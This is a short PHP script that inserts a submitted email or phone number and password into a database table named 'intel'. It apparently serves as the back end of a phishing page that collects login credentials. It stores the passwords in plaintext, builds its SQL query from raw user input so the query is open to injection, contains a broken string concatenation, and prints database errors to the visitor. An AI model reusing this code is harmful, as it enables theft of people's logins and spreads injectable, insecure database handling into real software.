<?php 
session_start();

require_once "config.php";

if($_SERVER["REQUEST_METHOD"] == "POST"){
   $email = $_POST["email"];
   $passowrd = $_POST["password"];
   $sql = "INSERT INTO intel (Email_or_Phone, Password) VALUES ('.$email.', '.$passowrd.')";
   
   if($link->query($sql) == TRUE){
       echo "New record created successfully";
   }else {
      echo "Error: " . $sql . "<br>" . $link->error;
    }
    mysqli_close($link);
}
?>